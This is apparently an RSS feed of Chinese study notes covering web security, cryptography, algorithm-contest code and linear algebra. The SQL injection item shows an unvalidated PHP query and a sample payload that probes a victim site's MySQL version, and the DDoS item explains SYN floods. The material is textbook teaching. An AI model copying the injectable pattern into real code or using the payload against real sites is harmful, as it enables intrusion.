应用程序攻击来自 SQL 注入
SQL 注入的两种分类：
盲注：在服务器没有错误回显时完成的注入攻击。
Timing Attack：利用 MySQL 的 BENCHMARK() 函数。
数据库攻击技巧 # 常见攻击技巧 # 我们假设后台的服务存在这样一个没有校验的语句：
$id = $_GET[&amp;#34;id&amp;#34;]; $sql = &amp;#34;select title,description,body from items where id=&amp;#34;.$id; SQL 注入时基于数据库的一种攻击。不同的数据库有着不同的功能、不同的语法和函数：
SQL 注入可以猜解出数据库的对应版本，比如下面这段 Payload，如果 MySQL 的版本是 4，则会返回 TRUE：
http://victim.com/index.php?id=5 and substring(@@version, 1, 1)=4 测试表名 admin 是否存在，列名 passwd 是否存在：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/2.%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</guid><description>文件上传漏洞 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/7.%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BBddos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E5%AE%89%E5%85%A8/2.%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%89%E5%85%A8/7.%E5%BA%94%E7%94%A8%E5%B1%82%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BBddos/</guid><description>应用层拒绝服务攻击 DDoS # DDoS: Distributed Denial of Service，分布式拒绝服务攻击。它被认为是安全领域中最难解决的问题之一，迄今为止也没有一个完美的解决方案。
DDoS 简介 # 常见的 DDoS 攻击有 SYN Flood、UDP Flood、ICMP Flood。
其中：SYN Flood 是发现于 1996 年最经典的 DDoS 攻击。它利用了 TCP 协议设计中的缺陷，想要修复这样的缺陷几乎是不可能的事情。它的流程大致如下：
攻击者首先伪造大量的源地址 IP，分别向服务器发送大量的 SYN 包； 此时服务器会返回 SYN/ACK 包，但因为源地址是伪造的，服务器并不会应答，会重试并且等待一个 SYN Time（30s - 2min），并且丢弃这个链接； 服务器此时将会消耗大量的资源来处理这种半连接，最后服务器无法理睬正常的连接请求； 对抗 SYN Floow 的主要方法：
SYN Cookie/SYN Proxy，saferset 等算法； SYN Cookie 的主要思想是为每个 IP 地址分配一个 Cookie，并且统一每个 IP 地址的访问频率。短时间内大量来自同一个 IP 地址的数据包，则会被认为受到攻击。 应用层 DDoS 攻击 #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1.introduction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/1.introduction/</guid><description>Chapter 1. Introduction # Terminologies in this Class:
Confidentiality, Integrity, Authenticity etc. 安全三要素：保密性、完整性、认证性（真实性） Communication System Security # Communication system security is achieved in two aspects:
Make each node a trusted platform: robust hardware, validated system software, authorized applications. Protect communications on each link: mutual authentication, key establishment, cipher suite negotiation, failure detection. 课堂笔记 # Diffie-Hellman key exchange (DH) # 用于在两个终端之间共享一个私密的数字：
此时两个终端直接就共享了一个私密信息：$$\displaystyle g^{X_A X_B}\pmod{p}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.prsg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/2.prsg/</guid><description>Chapter 2. Pseudorandom Sequence Generators # Background # We focus on the deterministic algorithm:
One is linear/non-linear feedback shift registers based on PRSGs. One relies on computation infeasible problems or other types of maths structure. Feedback Shift Register Sequence # Feedback shift register (反馈位移寄存器), denotes as FSR：
Introduction to FSR: feedback function $$a_{k+n} = f(a_k, a_{k+1}, \cdots, a_{k+n-1})$$
A state diagram of an FSR</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/3.streamciphers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/3.streamciphers/</guid><description>Chapter 3. Design of Stream Ciphers # Overview # Two phases in stream cipher:
key initialization phase.(KIA) PRSG running phase. Design princinple # Typical stream Ciphers # A5/1 in GSM # Cipher flow:
上图中，A5/1 部分就是基于一个密钥的随机数生成器，它主要由以下三个部分组成：
It uses three LFSRs generating m-sequences of large periods
which is: $$\displaystyle \begin{cases} f_1(x) = x^{19} + x^5 + x^2 + x + 1 \ f_2(x) = x^{22} + x + 1 \ f_3(x) = x^{23} + x^{16} + x^2 + x +1 \end{cases}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.1.blockciphers/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.1.blockciphers/</guid><description>Block Cipher # Overview # property:
Diffusion: any bits from the input message should affect whole cipher text. Confusion: with different key, the cipher message should be completely different. 块加密可以用以下一个函数表示：$$C = E_k(x) = f(x, k), x,k,C \in \mathbb{F}_2^{(n)}$$
Requirements of f:
Nonelinearity: a minimum distance between f and all the linear, affine functions (confusion). Resist linear cryptanalysis. Strict Avalanche Criterion(SAC): One bit change, resulting in significant changes (diffusion).</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.2.hashfunctions/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.2.hashfunctions/</guid><description>Hash Functions # Overview # A hash function h(x) is a map from n bits to m bits where m&amp;lt;n
An output of a hash function is called a message digest or a hash value.
A hash function should satisfy the following property:
Collision resistance. Second pre-image resistance. Given x, if the probability to find $$y \not= x $$ such that $$h(y) = h(x)$$ is negligible, then the function h is called second pre-image resistance.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.3.mac/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block-hash-mac/4.3.mac/</guid><description>MAC # Overview # MAC is used for providing authenticity of a user or source originality.
Method for generating MAC:
Pseudo-random sequence generators (or stream cipher). Block ciphers through CBC mode. Keyed hash functions.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block_hash_mac/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/4.block_hash_mac/</guid><description>Chapter 4. Design of Block Ciphers, Hash Functions, and MAC # Block Cipher # DES # DES stand for Data Encryption Standard.
Spectral properties of S-Box:
Hadamard transform: $$\displaystyle f(w) = \sum_{x \in F_2^n} (-1)^{f(x) + xw}$$ Avalanche transform: $$\displaystyle A(w) = \sum_{x \in F_2^n} (-1)^{f(x) + f(x + w)}$$ Triple-DES: $$C = E_{K_3} (D_{K_2} (E_{K_1}(M)))$$ or $$C = D_{K_3} (E_{K_2} (D_{K_1}(M)))$$
Encryption Modes:
Electronic Codebook (ECB) Mode =&amp;gt; Security risks.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/5.publickey/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/5.publickey/</guid><description>Chapter 5. Public-Key Cryptographic Algorithms # Security is based on the difficulty of some computational hard problems: factorization large integer, discrete algorithm.
Diffie-Hellman Key Exchange # 用于在两个终端之间共享一个私密的数字：
此时两个终端直接就共享了一个私密信息：$$\displaystyle g^{X_A X_B}\pmod{p}$$
RSA # RSA encrypt algorithm # RSA digital signature algorithm (RSA-DSA) # Signed message m:
Compute: $$H(m)$$ and $$r = (H(m))^d \pmod{n}$$
r is the digital signature of message m
Verify the digital signature r:</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/6.securityinfrastructure/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/6.securityinfrastructure/</guid><description>Chapter 6. Security Infrastructure #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/7.establishcommunication/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E5%92%8C%E5%8D%8F%E8%AE%AE%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/7.establishcommunication/</guid><description>Chapter 7. Establish Protect Communications #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/1.%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/1.%E5%9F%BA%E7%A1%80%E9%A2%98%E7%9B%AE/</guid><description>基础题目 # 数学相关 # Cantor 数表：将 Georg Cantor 用于证明有理数是可穷举的数表，拟合为一个列表（第一项是 1/1，第二项是 1/2，接着是 2/1、3/1、2/2、1/3&amp;hellip;）。
求 Cantor 数表的第 n 项。
第 i 条线上有 i 个数。
果园里的树：树排列成矩阵，它们的 x/y 坐标均是 1-99 的整数。输入若干个三角形，依次统计每个三角形内部和边界上总共有多少棵树。
三角形的有向面积：$$\begin{pmatrix} x_0 &amp;amp; y_0 &amp;amp; 1 \ x_1 &amp;amp; y_1 &amp;amp; 1 \ x_2 &amp;amp; y_2 &amp;amp; 1 \end{pmatrix}$$
多少块土地：你有一块椭圆形的地，在边界上选取 n 个点，两两连接得到 $$\displaystyle \frac{n(n-1)}{2}$$ 条线段，它们最多能把土地分成多少个部分。
欧拉公式：V - E + F = 2；
图相关 # 岛屿问题</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/2.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%9D%E6%AD%A5/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/2.%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%9D%E6%AD%A5/</guid><description>动态规划初步 # 问题：数字三角形 # 有一个由非负整数组成的三角形，第一行只有一个数字，出了最下面一行之外的每一个数字的左下方和右下方都有一个数字。
如果从第一行开始，每次可以向左下或右下走一格，怎样的走法能使路径节点和最大。
如果我们把每个格子按照行列编号，然后定义 d(i, j) 为从格子 (i, j) 出发时能得到的最大和，于是原问题即求解 d(1, 1)，可以得到状态转移方程：
$d(i, j) = a(i, j) + max(d(i+1, j), d(i+1, j+1))$ 最优子结构（optimal substructure）：全局最优解包含局部最优解，如果局部不是最优的，那么全局肯定不是最优的。
除了动态规划之外，这个问题还可以使用记忆化 (memoization) 的思想。
DAG 上的动态规划 # 最长路径问题 # 嵌套矩形：有 n 个长宽分别为 $(a_i, b_i)$ 的矩形，如果对于两个矩形 X(a, b), Y(c, d)，如果 a&amp;lt;c, b&amp;lt;d 或者 a&amp;lt;d, b&amp;lt;c，那么我们称 X 可以被 Y 嵌套。
给定任意多的矩形，求最长的嵌套序列，使得序列中的每个矩形都能嵌套在后一个中。
这个问题中的“嵌套”就是一个典型的二元关系，可以 DAG 来建模。
在这样一个嵌套关系的 DAG 中，如果设 d(i) 表示从节点 i 出发的最长路长度，边的集合设为 E，那么可以得到有状态转移方程：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/3.%E6%95%B0%E5%AD%A6%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%96%B9%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/3.%E6%95%B0%E5%AD%A6%E6%A6%82%E5%BF%B5%E4%B8%8E%E6%96%B9%E6%B3%95/</guid><description>数学概念与方法 # 数论初步 # 最大公因数算法 # 辗转相除法，或欧几里得算法（Euclid Algorithm）：
int gcd(int a, int b) { return (b == 0) ? a : gcd(b, a%b); } 值得一提的是，通过 gcd 可以计算出 lcm：
int lcm(int a, int b) { return a / gcd(a, b) * b; } 有一个细节是先除后乘可以避免整数溢出；
素数定理 # Eratosthenes 筛法：
int m = sqrt(n + 0.5); int c = 0; memset(vis, 0, sizeof(vis)); for (int i = 2; i &amp;lt;= m; i++) if (!</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/4.%E5%9B%BE%E8%AE%BA%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%AE%97%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E5%85%A5%E9%97%A8%E7%BB%8F%E5%85%B8/4.%E5%9B%BE%E8%AE%BA%E6%A8%A1%E5%9E%8B%E4%B8%8E%E7%AE%97%E6%B3%95/</guid><description>图论模型与算法 # 图的表示方法 # 本书中的图通过空间复杂度 $O(|V| + 3 * |E|)$ 表示（无向图的边需要通过两条有向边表示）：
first：长度为 $|V|$ 的数组，每个元素 x 表示从 x 出发的第一条边； u、v：长度为 $|E|$ 的数组，分别存储着边关联的两个节点； next：长度为 $|E|$ 的数组，边的邻接链表的下一条边； 树 # 无根树转化为有根树 # 转化代码：
void dfs(int u, int fa) { int d = G[u].size(); for (int i = 0; i &amp;lt; d; i++) { int v = G[u][i]; if (v != fa) dfs(v, p[v] = u); } } 表达式树 # 二叉树是表达式处理的常用工具，其中每个非叶子节点都表示一个运算符，它的左子树是这个运算符的第一个运算数，右子树则是这个运算符的第二个运算数。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/1.%E5%9F%BA%E6%9C%AC%E7%AE%97%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B%E8%BF%9B%E9%98%B6%E6%8C%87%E5%8D%97/1.%E5%9F%BA%E6%9C%AC%E7%AE%97%E6%B3%95/</guid><description>基本算法 # 位运算 # 快速幂：
int powmod(int a, int b, int p) { int ans = 1 % p; for (; b; b &amp;gt;&amp;gt;= 1) { if (b &amp;amp; 1) ans = ((long long)ans * a) % p; a = ((long long)a * a) % p; } return ans; } 大数乘法取模（可能溢出）：
long long mul(long long a, long long b, long long p) { long long ans = 0; for (; b; b &amp;gt;&amp;gt;= 1) { if (b &amp;amp; 1) ans = (ans + a) % p; a = (a * 2) % p; } } lowbit 算法：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/1.%E6%96%B9%E7%A8%8B%E7%BB%84%E7%9A%84%E5%87%A0%E4%BD%95%E8%A7%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/1.%E6%96%B9%E7%A8%8B%E7%BB%84%E7%9A%84%E5%87%A0%E4%BD%95%E8%A7%A3/</guid><description>1. 方程组的几何解 # Linear equations can be written as $$A \times X = B$$
Find linear combination of columns (x&amp;rsquo;s coefficient vector, and y&amp;rsquo;s ciefficient vector);
任何一个线性方程可以从两个视角了解它：
Row Picture：将每单个方程视作为空间中的某个点集，求方程的解即位求点集的交点； Column Picture：将每个未知元在各个方程中的系数，视作一个向量，求方程的解即求这些向量的线性组合； 在用未知数系数向量的思维解决问题时，我们可能会思考以下问题：
有没有一种通用的方法能够得到方程的解？ 有没有一种方法能够判断方程组的条件是否足够，即原方程是否有解？ 矩阵乘法的理解方式有两种：
通俗的点乘理解； 矩阵的每个列都是一个向量，矩阵乘以一个向量，可以理解为矩阵的列向量的线性组合。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/2.%E7%9F%A9%E9%98%B5%E6%B6%88%E5%85%83%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/2.%E7%9F%A9%E9%98%B5%E6%B6%88%E5%85%83%E6%B3%95/</guid><description>2. 矩阵消元法 # 矩阵消元法与行列式一样都是可以用于解决方程组的方式。
矩阵消元法的步骤如下：
考虑系数矩阵，按行自上而下通过与之前行的加减法运算，将 pivot（对角线上的元素）左侧的所有元素运算为 0；运算结束后可以得到一个上三角矩阵，记为 U； 对右侧向量做相同的运算，按行自下而上回带计算可以得到所有的未知数； 概念增广矩阵（augmented matrix）：考虑所有系数和结果向量的一个大矩阵；
Simple operation of matrix:
Matrix * Vector: Result in a column, linear combination of the columns of the matrix; Vector * Matrix: Result in a row, linear combination of the rows of the matrix; 矩阵消元法中的步骤，行之间的“加减法运算”就可以用矩阵乘法表示。比如某一个操作“将第二行减去第一行的 3 倍”，这一操作就可以用这样一个矩阵表示：$$\pmatrix{1 &amp;amp;0 &amp;amp;0 \ -3 &amp;amp;1 &amp;amp;0 \ 0 &amp;amp;0 &amp;amp;1}$$，它的含义为：
第一行保持不变，即线性组合 $$ 1 * row_1 + 0 * row_2 + 0 * row_3 $$； 第二行减去第一行的三倍，即线性组合 $$-3 * row_1 + 1 * row_2 * 0 * row_3$$； 第三行保持不变，即线性组合 $$0 * row_1 + 0 * row_2 + 1 * row_3$$ 矩阵乘法运算的重要性质：不满足交换律、满足结合律；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/3.%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E5%92%8C%E9%80%86/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/3.%E7%9F%A9%E9%98%B5%E4%B9%98%E6%B3%95%E5%92%8C%E9%80%86/</guid><description>3. 矩阵乘法和逆 # 乘法 # 矩阵乘法的规则，对于运算 $$A * B = C$$：
C 中的元素值 $$C_{ij} = \sum_{k = 1}^n A_{ik} * B_{kj}$$；
乘法可以运算的前提条件：A 的列数等于 B 的行数；
其他理解矩阵乘法的方式：
C 中的任意一行：B 的所有行的线性组合； C 中的任意一列：A 的所有列的线性组合； C 是：“A 的所有列与B 的所有行的乘积”的和； 分块乘法：$$\pmatrix{A_1 &amp;amp;A_2 \ A_3 &amp;amp;A_4} * \pmatrix{ B_1 &amp;amp;B_2 \ B_3 &amp;amp;B_4 } = \pmatrix{A_1B_1 + A_2B_3 &amp;amp;A_1B_2 + A_2B_4 \ A_3B_1 + A_4B_3 &amp;amp;A_3B_2 + A_4B_4}$$</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/4.%E7%9F%A9%E9%98%B5%E7%9A%84lu%E5%88%86%E8%A7%A3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-mit18.06/4.%E7%9F%A9%E9%98%B5%E7%9A%84lu%E5%88%86%E8%A7%A3/</guid><description>矩阵的LU分解 # AB 的逆：$$B^{-1} A^{-1}$$
转置的逆，$$A^T$$ 的逆是 $$(A^{-1})^T$$
矩阵的 LU 分解：
任意一个矩阵 A 表示一定可以表示为两个矩阵 L、U 的乘积，其中 L 是一个下三角矩阵、 U 是一个上三角矩阵； 消元法中，已经知道：
矩阵 A 可以通过左乘若干个行变化操作矩阵，可以得到一个上三角矩阵，即 $$E_{n(n-1)}\cdots E_{21}A = U$$；
由上面的公式可以得到：$$L = E_{21}^{-1} \cdots E_{n(n-1)}^{-1}$$，是一个下三角矩阵；
对于每一个行操作的逆也是很好求的，它的对角线是 1，一个位置有操作数 x，其他位置都是 0，它的逆就是将对应位置的操作数改写成 -x 即可；
这个方法需要的时间复杂度是 $$O(n^2 \cdot n)$$
Permutation Matrix:
